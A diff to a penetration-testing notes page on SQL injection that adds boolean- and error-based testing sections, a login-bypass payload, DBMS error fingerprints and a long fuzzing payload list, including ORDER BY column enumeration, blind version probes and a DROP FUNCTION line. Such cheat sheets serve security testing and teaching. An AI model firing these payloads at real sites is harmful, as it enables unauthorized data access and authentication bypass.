@@ -12,7 +12,255 @@ tags:
 See a more detailed [explanation about SQL injection](webexploitation/sql-injection).
 
 
+### Boolean-based testing
+
+#### Integer based parameter injection
+
+Common in Integer based parameter injection such as:
+
+```
+URL: https://site.com/user.php?id=1
+SQL query: SELECT * FROM users WHERE id= FUZZ;
+```
+
+Typical payloads for that query:
+
+```
+# Return true
+AND 1
+And true
+
+# Return False
+AND 0
+And false
+
+# Return 56 if vulnerable
+1*56
+
+# Return 1 if not vulnerable
+1*56
+
+```
+
+
+#### String based parameter injection
+
+```
+URL: https://site.com/user.php?id=alexis
+SQL query: SELECT * FROM users WHERE name= 'FUZZ';
+```
+
+Typical payloads for that query:
+
+```
+# Return true
+''
+""
+
+# Return false
+'
+"
+```
+
+
+**Exploiting single quote (')**: In SQL, the single quote is used to delimit string literals. A way to exploit this is in a Login form:
+
+```
+# SQL query
+SELECT * FROM users WHERE username = '<username>' AND password = '<password>'
+
+# Payload
+' OR '1'='1'; --
+
+# The attacker's injected SQL code ' OR '1'='1'; -- causes the condition '1'='1' to evaluate to true, effectively bypassing the
+authentication mechanism. Modified query would became
+SELECT * FROM users WHERE username = '' OR '1'='1'; -- ' AND password = '<password>'
+```
+
+
+### Error-based testing
+
+Firstable, every DBMS/RDBMS responds to incorrect/erroneous SQL queries with different error messages, so an error response can be use to fingerprint the database:
+
+A typical error from MS-SQL will look like this:
+
+```
+Incorrect syntax near [query snippet]
+```
+
+
+While a typical MySQL error looks more like this:
+
+```
+You have an error in your SQL syntax. Check the manual that corresponds
+to your MySQL server version for the right syntax to use near [query
+snippet]
+```
+
+
+```
+
+ OR 1=1
+ OR 1=0
+ OR x=x
+ OR x=y
+ OR 1=1#
+ OR 1=0#
+ OR x=x#
+ OR x=y#
+ OR 1=1-- 
+ OR 1=0-- 
+ OR x=x-- 
+ OR x=y-- 
+ OR 3409=3409 AND ('pytW' LIKE 'pytW
+ OR 3409=3409 AND ('pytW' LIKE 'pytY
+ HAVING 1=1
+ HAVING 1=0
+ HAVING 1=1#
+ HAVING 1=0#
+ HAVING 1=1-- 
+ HAVING 1=0-- 
+ AND 1=1
+ AND 1=0
+ AND 1=1-- 
+ AND 1=0-- 
+ AND 1=1#
+ AND 1=0#
+ AND 1=1 AND '%'='
+ AND 1=0 AND '%'='
+ AND 1083=1083 AND (1427=1427
+ AND 7506=9091 AND (5913=5913
+ AND 1083=1083 AND ('1427=1427
+ AND 7506=9091 AND ('5913=5913
+ AND 7300=7300 AND 'pKlZ'='pKlZ
+ AND 7300=7300 AND 'pKlZ'='pKlY
+ AND 7300=7300 AND ('pKlZ'='pKlZ
+ AND 7300=7300 AND ('pKlZ'='pKlY
+ AS INJECTX WHERE 1=1 AND 1=1
+ AS INJECTX WHERE 1=1 AND 1=0
+ AS INJECTX WHERE 1=1 AND 1=1#
+ AS INJECTX WHERE 1=1 AND 1=0#
+ AS INJECTX WHERE 1=1 AND 1=1--
+ AS INJECTX WHERE 1=1 AND 1=0--
+ WHERE 1=1 AND 1=1
+ WHERE 1=1 AND 1=0
+ WHERE 1=1 AND 1=1#
+ WHERE 1=1 AND 1=0#
+ WHERE 1=1 AND 1=1--
+ WHERE 1=1 AND 1=0--
+ ORDER BY 1-- 
+ ORDER BY 2-- 
+ ORDER BY 3-- 
+ ORDER BY 4-- 
+ ORDER BY 5-- 
+ ORDER BY 6-- 
+ ORDER BY 7-- 
+ ORDER BY 8-- 
+ ORDER BY 9-- 
+ ORDER BY 10-- 
+ ORDER BY 11-- 
+ ORDER BY 12-- 
+ ORDER BY 13-- 
+ ORDER BY 14-- 
+ ORDER BY 15-- 
+ ORDER BY 16-- 
+ ORDER BY 17-- 
+ ORDER BY 18-- 
+ ORDER BY 19-- 
+ ORDER BY 20-- 
+ ORDER BY 21-- 
+ ORDER BY 22-- 
+ ORDER BY 23-- 
+ ORDER BY 24-- 
+ ORDER BY 25-- 
+ ORDER BY 26-- 
+ ORDER BY 27-- 
+ ORDER BY 28-- 
+ ORDER BY 29-- 
+ ORDER BY 30-- 
+ ORDER BY 31337-- 
+ ORDER BY 1# 
+ ORDER BY 2# 
+ ORDER BY 3# 
+ ORDER BY 4# 
+ ORDER BY 5# 
+ ORDER BY 6# 
+ ORDER BY 7# 
+ ORDER BY 8# 
+ ORDER BY 9# 
+ ORDER BY 10# 
+ ORDER BY 11# 
+ ORDER BY 12# 
+ ORDER BY 13# 
+ ORDER BY 14# 
+ ORDER BY 15# 
+ ORDER BY 16# 
+ ORDER BY 17# 
+ ORDER BY 18# 
+ ORDER BY 19# 
+ ORDER BY 20# 
+ ORDER BY 21# 
+ ORDER BY 22# 
+ ORDER BY 23# 
+ ORDER BY 24# 
+ ORDER BY 25# 
+ ORDER BY 26# 
+ ORDER BY 27# 
+ ORDER BY 28# 
+ ORDER BY 29# 
+ ORDER BY 30#
+ ORDER BY 31337#
+ ORDER BY 1 
+ ORDER BY 2 
+ ORDER BY 3 
+ ORDER BY 4 
+ ORDER BY 5 
+ ORDER BY 6 
+ ORDER BY 7 
+ ORDER BY 8 
+ ORDER BY 9 
+ ORDER BY 10 
+ ORDER BY 11 
+ ORDER BY 12 
+ ORDER BY 13 
+ ORDER BY 14 
+ ORDER BY 15 
+ ORDER BY 16 
+ ORDER BY 17 
+ ORDER BY 18 
+ ORDER BY 19 
+ ORDER BY 20 
+ ORDER BY 21 
+ ORDER BY 22 
+ ORDER BY 23 
+ ORDER BY 24 
+ ORDER BY 25 
+ ORDER BY 26 
+ ORDER BY 27 
+ ORDER BY 28 
+ ORDER BY 29 
+ ORDER BY 30 
+ ORDER BY 31337 
+ RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+ RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='
+IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--
+IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--
+%' AND 8310=8310 AND '%'='
+%' AND 8310=8311 AND '%'='
+ and (select substring(@@version,1,1))='X'
+ and (select substring(@@version,1,1))='M'
+ and (select substring(@@version,2,1))='i'
+ and (select substring(@@version,2,1))='y'
+ and (select substring(@@version,3,1))='c'
+ and (select substring(@@version,3,1))='S'
+ and (select substring(@@version,3,1))='X'
+```
+
+
+
+
 ### Manual UNION attack
+
 
 ```
 # 0. Comments 
@@ -24,6 +272,11 @@ See a more detailed [explanation about SQL injection](webexploitation/sql-inject
 #comment        // MySQL
 -- comment      // MySQL [Note the space after the double dash]
 /*comment*/     // MySQL
+
+# Access (using null characters)
+' OR '1'='1' %00
+' OR '1'='1' %16
+
 
    
 # 1. Bypass a form      
